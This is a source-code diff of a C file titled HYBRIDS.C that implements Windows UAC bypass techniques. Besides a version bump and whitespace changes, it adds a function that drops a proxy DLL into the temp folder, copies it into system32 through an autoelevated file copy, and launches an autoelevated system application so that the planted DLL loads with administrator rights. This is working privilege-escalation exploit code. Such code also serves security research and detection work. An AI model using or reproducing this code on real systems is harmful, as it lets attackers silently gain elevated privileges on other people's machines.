@@ -4,9 +4,9 @@
 *
 *  TITLE:       HYBRIDS.C
 *
-*  VERSION:     1.91
+*  VERSION:     1.93
 *
-*  DATE:        12 Oct 2015
+*  DATE:        05 Nov 2015
 *
 *  Hybrid UAC bypass methods.
 *
@@ -426,9 +426,9 @@ BOOL ucmH1N1Method(
 	DWORD ProxyDllSize
 	)
 {
-	BOOL					cond = FALSE, bResult = FALSE;
-	DWORD					c;
-	HANDLE					hProcess = NULL, hRemoteThread = NULL;
+	BOOL                    cond = FALSE, bResult = FALSE;
+	DWORD                   c;
+	HANDLE                  hProcess = NULL, hRemoteThread = NULL;
 	HINSTANCE               selfmodule = GetModuleHandle(NULL);
 	PIMAGE_DOS_HEADER       pdosh = (PIMAGE_DOS_HEADER)selfmodule;
 	PIMAGE_FILE_HEADER      fh = (PIMAGE_FILE_HEADER)((char *)pdosh + pdosh->e_lfanew + sizeof(DWORD));
@@ -551,5 +551,90 @@ BOOL ucmH1N1Method(
 		TerminateProcess(hProcess, 0);
 		CloseHandle(hProcess);
 	}
+	return bResult;
+}
+
+/*
+* ucmGenericAutoelevation
+*
+* Purpose:
+*
+* Bypass UAC by abusing target autoelevated system32 application via missing system32 dll
+*
+*/
+BOOL ucmGenericAutoelevation(
+	LPWSTR lpTargetApp,
+	LPWSTR lpTargetDll,
+	PVOID ProxyDll,
+	DWORD ProxyDllSize
+	)
+{
+	BOOL bResult = FALSE, cond = FALSE;
+	WCHAR szSource[MAX_PATH + 1];
+	WCHAR szDest[MAX_PATH + 1];
+	WCHAR szBuffer[MAX_PATH + 1];
+
+	if (
+		(ProxyDll == NULL) ||
+		(ProxyDllSize == 0) ||
+		(lpTargetApp == NULL) ||
+		(lpTargetDll == NULL)
+		)
+	{
+		return bResult;
+	}
+
+	if (_strlen_w(lpTargetDll) > 100) {
+		return bResult;
+	}
+
+	do {
+
+		//put target dll
+		RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
+		_strcpy_w(szBuffer, TEMPDIR);
+		_strcat_w(szBuffer, lpTargetDll);
+
+		//expand string for proxy dll
+		RtlSecureZeroMemory(szSource, sizeof(szSource));
+		if (ExpandEnvironmentStrings(szBuffer, szSource, MAX_PATH) == 0) {
+			break;
+		}
+
+		//write proxy dll to disk
+		if (!supWriteBufferToFile(szSource, ProxyDll, ProxyDllSize)) {
+			OutputDebugString(TEXT("[UCM] Failed to drop dll"));
+			break;
+		}
+		else {
+			OutputDebugStringW(TEXT("[UCM] Dll dropped successfully"));
+		}
+
+		//expand string for target dir
+		RtlSecureZeroMemory(szDest, sizeof(szDest));
+		if (ExpandEnvironmentStringsW(SYSTEMROOTDIR,
+			szDest, MAX_PATH) == 0)
+		{
+			break;
+		}
+
+		//drop fubuki to system32
+		bResult = ucmAutoElevateCopyFile(szSource, szDest);
+		if (!bResult) {
+			break;
+		}
+
+		RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
+		if (ExpandEnvironmentStringsW(lpTargetApp,
+			szBuffer, MAX_PATH) == 0)
+		{
+			break;
+		}
+
+		//run target app
+		bResult = supRunProcess(szBuffer, NULL);
+
+	} while (cond);
+
 	return bResult;
 }
